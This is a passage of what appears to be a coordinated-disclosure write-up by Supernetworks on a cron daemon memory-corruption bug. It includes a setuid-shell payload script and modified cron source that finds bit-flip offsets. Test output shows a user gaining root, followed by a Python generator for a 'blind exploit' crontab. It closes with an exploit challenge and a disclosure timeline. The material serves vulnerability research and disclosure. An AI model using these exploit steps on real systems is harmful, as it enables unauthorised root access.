The `/tmp/sh` script can be set as
```bash
#!/bin/sh
# demo.sh
if [ "$(id -u)" -ne 0 ]; then
  exit 0;
fi
cp /bin/sh /usr/
chmod 4755 /usr/sh
echo success | wall
```
The missing piece now is which offsets to flip bits on.
We can modify `entry.c` to search as well as demonstrate the concept
```c
//modifications to entry.c
#include
#include
#include
#include
int
is\_address\_mapped(void \*addr)
{
unsigned int result;
size\_t len = sysconf(\_SC\_PAGESIZE);
void           \*page\_aligned\_addr = (void \*) ((uintptr\_t) addr & ~(len - 1));
result = msync(page\_aligned\_addr, len, MS\_SYNC);
if (result == 0) {
return 1;
}
return 0;
}
extern user    \*g\_user; //set in user.c's load\_user
// bit patterns to modify pwd with to point into an environment.
// many more are valid but these represent some common values for nearby allocations
uint64\_t flips [] = {0x15e0, 0x1ae0, 0x1fe0, 0x25e0, 0x1ae0, 0x2fe0, 0x85e0, 0x8ae0, 0x8fe0, 0};
void
run\_poc(bitstr\_t \* bits, int low, int high, int start, int stop, int step)
{
int candidates[256];
int cstep = 0;
int cdone = 0;
entry          \*ee;
int count = 0, gcount = 0;
SLIST\_FOREACH(ee, &g\_user->crontab, entries) {
count++;
uint64\_t pwd64 = (uint64\_t) ee->pwd;
uint64\_t delta = (uint64\_t) bits - (uint64\_t) & ee->pwd;
uint64\_t bits64 = (uint64\_t) bits;
//candidate @ ee->pwd is simply too far away
if (delta > 256 \* 1024 \* 1024)
continue;
//candidate wont exit loop after 1 bit set out of bounds
if (delta < 128 \* 1024 \* 1024)
continue;
for (int jflip = 0; flips[jflip] != 0; jflip++) {
uint64\_t flip = flips[jflip];
uint64\_t flipped = pwd64 | flip;
if (flipped != pwd64) {
if (is\_address\_mapped((void \*) flipped) != 1) {
continue;
}
//make sure flipped doesnt fall off at the end either
if (is\_address\_mapped((void \*) flipped + sizeof(\*ee->pwd)) != 1) {
continue;
}
//further validate that this makes sense.
struct passwd  \*pflip = (struct passwd \*) flipped;
if (1 != is\_address\_mapped(pflip->pw\_name))
continue;
if (1 != is\_address\_mapped(pflip->pw\_class))
continue;
if (1 != is\_address\_mapped(pflip->pw\_dir))
continue;
if (0 != pflip->pw\_uid)
continue;
{
gcount++;
printf("pflip @ %p orig pw @ %llx bits %p\n", pflip, pwd64, bits);
printf("===flip pattern %llx offset %llx ===\n", flip, (1ull << 32LL) - delta);
for (int bit = 63; bit >= 0; bit--) {
unsigned int mask = 1u << bit;
if (flip & mask) {
uint64\_t s = ((1ull << 32LL) - delta \* 8) + bit;
printf("0-0/%llu \* \* \* \* /tmp/write %llu\n", s, s);
if (cdone != 0)
candidates[cstep++] = s;
}
}
cdone = 1;
}
}
}
}
printf("searched %d entries with %d candidates pid %d\n", count, gcount, getpid());
if (gcount == 0)
exit(0);
for (int ci = 0; ci < cstep; ci++) {
step = candidates[ci];
int ecount = 0;
for (int i= start; i <= stop; i += step) {
bit\_set(bits, i);
ecount++;
}
}
}
int set\_range(bitstr\_t \* bits, int low, int high, int start, int stop, int step)
{
int i;
if (start < low || stop > high)
return (EOF);
start -= low;
stop -= low;
if (step == -2147483648) {
run\_poc(bits, low, high, start, stop, step);
return (0);
}
if (step == 1) {
bit\_nset(bits, start, stop);
} else {
for (i = start; i <= stop; i += step) {
bit\_set(bits, i);
}
}
return (0);
}
```
Testing:
python3 gen.py; cp z /var/cron/tabs/user
cp demo.sh /tmp/sh
cp demo.sh /tmp/write
while true; do ./cron -n; done
searched 32768 entries with 0 candidates pid 22670
...
After a moment
...
searched 32768 entries with 8 candidates pid 22757
[+] ran jobs. exit(0)
cron: setusercontext failed for A502=B: No such file or directory
pflip @ 0x73df44cffe0 orig pw @ 73df44c7000 bits 0x73e284660a0
===flip pattern 8fe0 offset f68721e8 ===
0-0/3023638351 \* \* \* \* /tmp/write 3023638351
0-0/3023638347 \* \* \* \* /tmp/write 3023638347
0-0/3023638346 \* \* \* \* /tmp/write 3023638346
0-0/3023638345 \* \* \* \* /tmp/write 3023638345
0-0/3023638344 \* \* \* \* /tmp/write 3023638344
0-0/3023638343 \* \* \* \* /tmp/write 3023638343
0-0/3023638342 \* \* \* \* /tmp/write 3023638342
0-0/3023638341 \* \* \* \* /tmp/write 3023638341
pflip @ 0x73df44cffe0 orig pw @ 73df44c7c00 bits 0x73e284660a0
===flip pattern 8fe0 offset f6872ca8 ===
0-0/3023660367 \* \* \* \* /tmp/write 3023660367
0-0/3023660363 \* \* \* \* /tmp/write 3023660363
0-0/3023660362 \* \* \* \* /tmp/write 3023660362
0-0/3023660361 \* \* \* \* /tmp/write 3023660361
0-0/3023660360 \* \* \* \* /tmp/write 3023660360
0-0/3023660359 \* \* \* \* /tmp/write 3023660359
0-0/3023660358 \* \* \* \* /tmp/write 3023660358
0-0/3023660357 \* \* \* \* /tmp/write 3023660357
searched 32768 entries with 4 candidates pid 75556
[+] ran jobs. exit(0)
Broadcast Message from A502=B@foo.my.domain                                                                                                                                            "foo.my.domain" 16:00 24-Jul-24
        ((not a tty)) at 16:00 ...
success
          command failed: 550 Invalid recipient:
And now `user` can elevate privileges with the dropped binary.
uid=1000(user) gid=1000(user) groups=1000(user)
foo$ /usr/sh
foo# id
uid=1000(user) euid=0(root) gid=1000(user) groups=1000(user)
So if a user is lucky, a blind exploit might look something like this:
```python3
#/usr/bin/env python3
f = open("user-crontab",'w')
f.write("USER=user\n")
f.write("LOGNAME=user\n")
f.write("SHELL=/bin/sh\n")
f.write("HOME=/home/user\n")
for i in range(512-8): #get 4k pages and see what happens
  prefix = "A%d"%i
  f.write(prefix + "=" + "B" + "\x00\n")
# Note: each entry gets distinct copy of the above environment.
for i in range(2\*\*15):
  f.write("\* \* \* \* \* " + "-q /tmp/sh" + "\n")
f.write("0-0/3023660367 \* \* \* \* /tmp/write 3023660367\n")
f.write("0-0/3023660363 \* \* \* \* /tmp/write 3023660363\n")
f.write("0-0/3023660362 \* \* \* \* /tmp/write 3023660362\n")
f.write("0-0/3023660361 \* \* \* \* /tmp/write 3023660361\n")
f.write("0-0/3023660360 \* \* \* \* /tmp/write 3023660360\n")
f.write("0-0/3023660359 \* \* \* \* /tmp/write 3023660359\n")
f.write("0-0/3023660358 \* \* \* \* /tmp/write 3023660358\n")
f.write("0-0/3023660357 \* \* \* \* /tmp/write 3023660357\n")
```
Combined with a memory disclosure primitive or a more reliable heap layout technique,
it might be possible to elevate privileges with a one-shot attempt against cron.
—----------------------
Supernetworks Challenge
—----------------------
In order to successfully obtain root, an attacker will need to either escalate privileges to crontab or create a crontab file that doesn't crash the crontab process, but also successfully exploits the cron daemon.
Show us a working exploit for this bug, and we'll ship you a WiFi Pod (https://www.supernetworks.org/#products).  Challenge rules can be found over at https://www.supernetworks.org/crontab-challenge.
--------
Disclosure Timeline
--------
24-JUL-2024 Disclosed vulnerability to Paul Vixie and Todd C. Miller
19-AUG-2024 Coordinated Release
—------—------—----
About Supernetworks
—------—------—----
We build easy to use, open source wifi routers in memory safe languages with advanced out of the box security features like per-device passwords and network isolation.

